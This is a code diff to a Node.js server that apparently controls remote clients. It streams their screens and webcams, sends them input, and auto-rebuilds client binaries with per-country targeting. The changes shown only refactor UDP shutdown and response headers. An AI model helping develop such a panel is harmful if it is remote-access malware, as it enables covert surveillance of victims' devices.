@@ -13,7 +13,7 @@ import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
+import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { countriesFor } from './builder/geo.js';
@@ -554,16 +554,7 @@ app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
   const bytes = getFrame(cid);
   if (!bytes) return res.status(204).end();
 
-  let ctype = 'application/octet-stream';
-  if (bytes.length >= 12 &&
-      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
-      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
-    ctype = 'image/webp';
-  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
-    ctype = 'image/jpeg';
-  }
-
-  res.setHeader('Content-Type', ctype);
+  res.setHeader('Content-Type', 'application/octet-stream');
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
   res.setHeader('Pragma', 'no-cache');
   res.setHeader('Expires', '0');
@@ -820,6 +811,7 @@ app.delete('/api/builds/:id', requireAuth, (req, res) => {
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
+
 // ---------- auto builder (every 6 hours) ----------
 const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000; // check every hour
 const MAX_AGE_MS = 6 * 60 * 60 * 1000; // rebuild if older than 6h
@@ -877,15 +869,20 @@ tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
 });
 
 let shuttingDown = false;
+
 function shutdown(sig) {
   if (shuttingDown) return;
   shuttingDown = true;
   console.log(`\n[shutdown] ${sig}`);
+  
   httpServer.close(() => console.log('[shutdown] http closed'));
   tlsHttpServer.close(() => console.log('[shutdown] https closed'));
-  try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
+  
+  closeUdp(); 
+  
   setTimeout(() => process.exit(0), 3000).unref();
 }
+
 process.on('SIGINT',  () => shutdown('SIGINT'));
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
